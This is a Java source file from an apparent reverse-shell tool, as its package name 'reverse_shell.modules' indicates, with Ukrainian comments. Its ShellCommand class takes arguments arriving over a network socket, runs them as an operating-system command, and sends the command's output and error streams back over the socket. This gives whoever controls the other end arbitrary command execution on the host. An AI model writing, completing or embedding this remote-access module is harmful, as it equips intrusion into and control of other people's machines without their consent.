package reverse_shell.modules;

import reverse_shell.CommandHandler;

import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class ShellCommand implements CommandHandler {
    @Override
    public void handle(String[] args, Socket socket) throws Exception {
        String command = String.join(" ", args);
        Process process = Runtime.getRuntime().exec(command);

        InputStream stdout = process.getInputStream();
        InputStream stderr = process.getErrorStream();
        OutputStream output = socket.getOutputStream();

        // Читання stdout
        byte[] buffer = new byte[1024];
        int bytesRead;
        while ((bytesRead = stdout.read(buffer)) != -1) {
            output.write(buffer, 0, bytesRead);
        }

        // Читання stderr
        while ((bytesRead = stderr.read(buffer)) != -1) {
            output.write(buffer, 0, bytesRead);
        }

        output.write("\n".getBytes());
    }
}